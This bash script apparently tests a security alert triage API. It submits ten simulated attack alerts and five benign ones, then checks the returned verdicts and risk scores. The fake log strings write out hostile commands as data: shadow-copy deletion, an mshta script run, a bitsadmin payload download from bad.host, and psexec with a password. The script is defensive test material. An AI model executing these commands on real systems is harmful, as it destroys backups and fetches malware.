#!/usr/bin/env bash
# Cycle 10 verification: 10 attack + 5 benign alerts through the API.
# Attacks must get verdict=true_positive with risk>=65.
# Benign must get verdict=benign with risk<=25.
MSYS_NO_PATHCONV=1
export MSYS_NO_PATHCONV

API="http://localhost:8090"

echo "========================================================================"
echo "  CYCLE 10 VERIFICATION — 10 attacks + 5 benign"
echo "========================================================================"

# Login
TOKEN=$(curl -sf -X POST "$API/api/v1/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@test.local","password":"TestPass2026"}' | grep -o '"token":"[^"]*"' | cut -d'"' -f4)

if [ -z "$TOKEN" ]; then
  echo "FATAL: Login failed"
  exit 1
fi
echo "Logged in. Token: ${TOKEN:0:20}..."

auth() { echo "Authorization: Bearer $TOKEN"; }

# Unique run ID to avoid dedup
RUN_ID="cycle10_$(date +%s)"

# Submit a task and return the task_id (handles dedup response)
submit() {
  local json="$1"
  local resp
  resp=$(curl -sf -X POST "$API/api/v1/tasks" \
    -H "$(auth)" -H "Content-Type: application/json" \
    -d "$json" 2>/dev/null)
  # Try task_id, then existing_task_id (dedup), then id
  echo "$resp" | grep -oE '"(task_id|existing_task_id|id)"\s*:\s*"[0-9a-f-]{36}"' | head -1 | grep -oE '[0-9a-f-]{36}'
}

# Poll until completed (max 60s extra after initial wait)
poll() {
  local task_id="$1"
  local deadline=$((SECONDS + 60))
  while [ $SECONDS -lt $deadline ]; do
    local resp
    resp=$(curl -sf "$API/api/v1/tasks/$task_id" -H "$(auth)" 2>/dev/null) || true
    local status
    status=$(echo "$resp" | grep -oE '"status"\s*:\s*"[^"]*"' | head -1 | cut -d'"' -f4)
    if [ "$status" = "completed" ] || [ "$status" = "failed" ] || [ "$status" = "error" ]; then
      echo "$resp"
      return
    fi
    sleep 5
  done
  echo "TIMEOUT"
}

# Extract field from JSON (lightweight, no jq dependency)
jfield() {
  local json="$1" field="$2"
  echo "$json" | grep -oE "\"$field\"\s*:\s*\"[^\"]*\"" | head -1 | cut -d'"' -f4
}
jnum() {
  local json="$1" field="$2"
  echo "$json" | grep -oE "\"$field\"\s*:\s*[0-9]+" | head -1 | grep -oE '[0-9]+$'
}

# ============== ATTACK ALERTS ==============
declare -a TASK_IDS=()
declare -a TASK_TYPES=()
declare -a CATEGORIES=()

echo ""
echo "Submitting 10 attack alerts..."

# 1. Brute Force
TID=$(submit '{"task_type":"brute_force","input":{"prompt":"SSH brute force","severity":"high","siem_event":{"title":"SSH Brute Force Attack","source_ip":"198.51.100.55","username":"root","rule_name":"BruteForce","raw_log":"500 failed password attempts for root from 198.51.100.55 in 10 minutes. Failed Failed Failed Failed Failed Failed Failed Failed Failed Failed"}}}')
TASK_IDS+=("$TID"); TASK_TYPES+=("brute_force"); CATEGORIES+=("ATTACK")
echo "  [1/10] brute_force: $TID"

# 2. Phishing
TID=$(submit '{"task_type":"phishing","input":{"prompt":"Phishing email","severity":"high","siem_event":{"title":"Phishing Email","source_ip":"203.0.113.77","username":"jsmith","rule_name":"PhishingDetection","raw_log":"From: alert@login-verify-account.com Subject: URGENT verify your account immediately or suspended. Click here: https://login-verify-account.com/secure/login.php password credential"}}}')
TASK_IDS+=("$TID"); TASK_TYPES+=("phishing"); CATEGORIES+=("ATTACK")
echo "  [2/10] phishing: $TID"

# 3. Ransomware (unique source_ip to avoid dedup)
TID=$(submit '{"task_type":"ransomware","input":{"prompt":"Ransomware shadow copy deletion","severity":"critical","siem_event":{"title":"Ransomware Activity","source_ip":"10.0.50.99","username":"SYSTEM","rule_name":"Ransomware","raw_log":"vssadmin delete shadows detected. wmic shadowcopy delete detected. Files with .locked extension found. README_DECRYPT.txt bitcoin payment ransom demanded."}}}')
TASK_IDS+=("$TID"); TASK_TYPES+=("ransomware"); CATEGORIES+=("ATTACK")
echo "  [3/10] ransomware: $TID"

# 4. Kerberoasting
TID=$(submit '{"task_type":"kerberoasting","input":{"prompt":"Kerberoasting","severity":"high","siem_event":{"title":"Kerberoasting Detected","source_ip":"10.0.20.15","username":"attacker_user","rule_name":"Kerberoasting","raw_log":"EventID=4769 TicketEncryptionType=0x17 ServiceName=MSSQLSvc/db01.corp.local:1433 TargetUserName=attacker_user ClientAddress=10.0.20.15"}}}')
TASK_IDS+=("$TID"); TASK_TYPES+=("kerberoasting"); CATEGORIES+=("ATTACK")
echo "  [4/10] kerberoasting: $TID"

# 5. DNS Exfiltration
TID=$(submit '{"task_type":"dns_exfiltration","input":{"prompt":"DNS exfil","severity":"high","siem_event":{"title":"DNS Exfiltration","source_ip":"10.0.30.44","username":"exfil_user","domain":"aGVsbG8gd29ybGQgZXhmaWx0cmF0aW9uIGRhdGE.evil-c2.xyz","rule_name":"DNSExfiltration","raw_log":"DNS TXT query: aGVsbG8gd29ybGQgZXhmaWx0cmF0aW9uIGRhdGE.evil-c2.xyz type=TXT queries=250 dns exfiltration high entropy tunnel nslookup 10.0.30.44"}}}')
TASK_IDS+=("$TID"); TASK_TYPES+=("dns_exfiltration"); CATEGORIES+=("ATTACK")
echo "  [5/10] dns_exfiltration: $TID"

# 6. C2 Communication
TID=$(submit '{"task_type":"c2_communication","input":{"prompt":"C2 beacon","severity":"high","siem_event":{"title":"C2 Beacon Detected","source_ip":"10.0.10.88","username":"compromised","rule_name":"C2Detection","raw_log":"beacon interval=60s stddev=1.2 connections=150 to xk7q9m2p.evil-c2.net:443 c2 beacon callback implant"}}}')
TASK_IDS+=("$TID"); TASK_TYPES+=("c2_communication"); CATEGORIES+=("ATTACK")
echo "  [6/10] c2_communication: $TID"

# 7. Data Exfiltration
TID=$(submit '{"task_type":"data_exfiltration","input":{"prompt":"Data exfil","severity":"high","siem_event":{"title":"Data Exfiltration","source_ip":"10.0.40.22","username":"data_thief","rule_name":"DataExfiltration","raw_log":"Transfer 2.5 GB to 203.0.113.99 external after.hours archive.rar compressed encrypted off-hours upload to dropbox"}}}')
TASK_IDS+=("$TID"); TASK_TYPES+=("data_exfiltration"); CATEGORIES+=("ATTACK")
echo "  [7/10] data_exfiltration: $TID"

# 8. LOLBin Abuse (avoid Windows path + AV triggers)
TID=$(submit '{"task_type":"lolbin_abuse","input":{"prompt":"Mshta abuse","severity":"high","siem_event":{"title":"LOLBin Abuse - mshta","source_ip":"10.0.60.34","username":"user2","rule_name":"LOLBinAbuse","raw_log":"mshta.exe vbscript:Execute(CreateObject(Wscript.Shell).Run(malicious)) bitsadmin transfer download http://bad.host/stage2.bin"}}}')
TASK_IDS+=("$TID"); TASK_TYPES+=("lolbin_abuse"); CATEGORIES+=("ATTACK")
echo "  [8/10] lolbin_abuse: $TID"

# 9. Lateral Movement
TID=$(submit '{"task_type":"lateral_movement","input":{"prompt":"PsExec lateral movement","severity":"high","siem_event":{"title":"Lateral Movement","source_ip":"10.0.20.10","destination_ip":"10.0.20.50","username":"admin_user","rule_name":"LateralMovement","raw_log":"psexec.exe \\\\10.0.20.50 -u admin_user -p Pass123 cmd.exe pass-the-hash ntlm admin$ lateral remote"}}}')
TASK_IDS+=("$TID"); TASK_TYPES+=("lateral_movement"); CATEGORIES+=("ATTACK")
echo "  [9/10] lateral_movement: $TID"

# 10. Golden Ticket
TID=$(submit '{"task_type":"golden_ticket","input":{"prompt":"Golden Ticket","severity":"critical","siem_event":{"title":"Golden Ticket Attack","source_ip":"10.0.20.77","username":"golden_attacker","rule_name":"GoldenTicket","raw_log":"EventID=4768 TicketEncryptionType=0x17 ServiceName=krbtgt TargetUserName=golden_attacker ClientAddress=10.0.20.77 Lifetime=8760h TicketOptions=0x50800000"}}}')
TASK_IDS+=("$TID"); TASK_TYPES+=("golden_ticket"); CATEGORIES+=("ATTACK")
echo "  [10/10] golden_ticket: $TID"

# ============== BENIGN ALERTS ==============
echo ""
echo "Submitting 5 benign alerts..."

# 1. Password Change
TID=$(submit '{"task_type":"password_change","input":{"prompt":"Password change","severity":"info","siem_event":{"title":"Password Changed","source_ip":"10.0.1.100","username":"jdoe","rule_name":"PasswordChange","raw_log":"User jdoe successfully changed password via self-service portal from 10.0.1.100"}}}')
TASK_IDS+=("$TID"); TASK_TYPES+=("password_change"); CATEGORIES+=("BENIGN")
echo "  [1/5] password_change: $TID"

# 2. Windows Update
TID=$(submit '{"task_type":"windows_update","input":{"prompt":"Windows update","severity":"info","siem_event":{"title":"Windows Update Applied","source_ip":"10.0.1.200","username":"SYSTEM","rule_name":"WindowsUpdate","raw_log":"Windows Update KB5034441 installed successfully on WORKSTATION-01"}}}')
TASK_IDS+=("$TID"); TASK_TYPES+=("windows_update"); CATEGORIES+=("BENIGN")
echo "  [2/5] windows_update: $TID"

# 3. Health Check
TID=$(submit '{"task_type":"health_check","input":{"prompt":"Health check","severity":"info","siem_event":{"title":"Health Check OK","source_ip":"10.0.1.1","username":"monitoring","rule_name":"HealthCheck","raw_log":"System health check passed. CPU 45 percent Memory 62 percent Disk 38 percent. All services normal."}}}')
TASK_IDS+=("$TID"); TASK_TYPES+=("health_check"); CATEGORIES+=("BENIGN")
echo "  [3/5] health_check: $TID"

# 4. Scheduled Backup
TID=$(submit '{"task_type":"scheduled_backup","input":{"prompt":"Nightly backup","severity":"info","siem_event":{"title":"Backup Completed","source_ip":"10.0.2.50","username":"backup_svc","rule_name":"ScheduledBackup","raw_log":"Nightly backup completed successfully. 150 GB backed up to tape. Next scheduled tomorrow."}}}')
TASK_IDS+=("$TID"); TASK_TYPES+=("scheduled_backup"); CATEGORIES+=("BENIGN")
echo "  [4/5] scheduled_backup: $TID"

# 5. User Login
TID=$(submit '{"task_type":"user_login","input":{"prompt":"Normal login","severity":"info","siem_event":{"title":"User Login","source_ip":"10.0.1.150","username":"asmith","rule_name":"UserLogin","raw_log":"User asmith logged in successfully via RDP from 10.0.1.150 at 09:00 UTC"}}}')
TASK_IDS+=("$TID"); TASK_TYPES+=("user_login"); CATEGORIES+=("BENIGN")
echo "  [5/5] user_login: $TID"

# Wait 120s for all investigations to complete
echo ""
echo "Waiting 120s for investigations to complete..."
sleep 120

# ============== POLL RESULTS ==============
echo ""
echo "========================================================================"
echo "  RESULTS"
echo "========================================================================"

ATTACK_PASS=0
ATTACK_FAIL=0
BENIGN_PASS=0
BENIGN_FAIL=0

for i in "${!TASK_IDS[@]}"; do
  TID="${TASK_IDS[$i]}"
  TTYPE="${TASK_TYPES[$i]}"
  CAT="${CATEGORIES[$i]}"

  RESP=$(poll "$TID")

  if [ "$RESP" = "TIMEOUT" ]; then
    printf "  TIMEOUT  %-6s %-25s id=%s\n" "$CAT" "$TTYPE" "$TID"
    if [ "$CAT" = "ATTACK" ]; then ((ATTACK_FAIL++)) || true; else ((BENIGN_FAIL++)) || true; fi
    continue
  fi

  # Extract verdict — check output sub-object first, then top-level
  VERDICT=$(echo "$RESP" | grep -oE '"output"\s*:\s*\{[^}]*"verdict"\s*:\s*"[^"]*"' | grep -oE '"verdict"\s*:\s*"[^"]*"' | head -1 | cut -d'"' -f4)
  if [ -z "$VERDICT" ]; then
    VERDICT=$(jfield "$RESP" "verdict")
  fi

  # Extract risk_score
  RISK=$(echo "$RESP" | grep -oE '"output"\s*:\s*\{[^}]*"risk_score"\s*:\s*[0-9]+' | grep -oE '[0-9]+$' | head -1)
  if [ -z "$RISK" ]; then
    RISK=$(jnum "$RESP" "risk_score")
  fi
  RISK=${RISK:-0}

  STATUS=$(jfield "$RESP" "status")

  if [ "$CAT" = "ATTACK" ]; then
    if [ "$VERDICT" = "true_positive" ] && [ "$RISK" -ge 65 ]; then
      ((ATTACK_PASS++)) || true
      LABEL="PASS"
    elif ([ "$VERDICT" = "needs_analyst_review" ] || [ "$VERDICT" = "needs_manual_review" ]) && [ "$RISK" -ge 65 ]; then
      ((ATTACK_PASS++)) || true
      LABEL="PASS"
    else
      ((ATTACK_FAIL++)) || true
      LABEL="FAIL"
    fi
  else
    if [ "$VERDICT" = "benign" ] && [ "$RISK" -le 25 ]; then
      ((BENIGN_PASS++)) || true
      LABEL="PASS"
    else
      ((BENIGN_FAIL++)) || true
      LABEL="FAIL"
    fi
  fi

  printf "  %-4s  %-6s %-25s verdict=%-20s risk=%-3s status=%s\n" "$LABEL" "$CAT" "$TTYPE" "$VERDICT" "$RISK" "$STATUS"
done

echo ""
echo "========================================================================"
echo "  ATTACKS:  $ATTACK_PASS/10 passed  (verdict=true_positive, risk>=65)"
echo "  BENIGN:   $BENIGN_PASS/5 passed   (verdict=benign, risk<=25)"
TOTAL=$((ATTACK_PASS + BENIGN_PASS))
echo "  TOTAL:    $TOTAL/15"
echo "========================================================================"

if [ $ATTACK_FAIL -gt 0 ] || [ $BENIGN_FAIL -gt 0 ]; then
  echo ""
  echo "FAILURES DETECTED"
  exit 1
else
  echo ""
  echo "ALL PASSED"
  exit 0
fi
